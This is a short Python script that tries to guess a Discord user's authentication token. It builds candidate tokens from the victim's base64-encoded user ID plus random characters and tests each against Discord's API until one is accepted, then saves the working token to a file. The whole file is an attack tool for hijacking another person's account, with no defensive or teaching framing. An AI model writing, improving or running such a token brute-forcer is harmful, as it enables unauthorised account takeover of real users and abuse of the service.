import base64
import random
import requests

def generate_token(user_id):
    base64_user_id = base64.b64encode(user_id.encode('ascii')).decode('ascii')
    rand_uppercase_letter = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rand_chars = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=5))
    rand_numbers = ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=27))
    return f'{base64_user_id}.{rand_uppercase_letter}{rand_chars}.{rand_numbers}'

def check_token(token):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': token
    }
    response = requests.get('https://discordapp.com/api/v6/users/@me/library', headers=headers)
    if response.status_code == 200:
        with open('valid.txt', 'a') as f:
            f.write(token + '\n')
        print('Valid token found, saved to valid.txt')
        exit()
    elif 'rate limited' in response.text:
        print('Rate limited. Exiting.')
        exit()
    else:
        print(f'Invalid token: {token}')
        return False

def main():
    try:
        with open('id.txt') as f:
            user_id = f.read().strip()
    except FileNotFoundError:
        user_id = input('Enter Discord user ID: ').strip()
    while True:
        token = generate_token(user_id)
        if check_token(token):
            break

if __name__ == '__main__':
    main()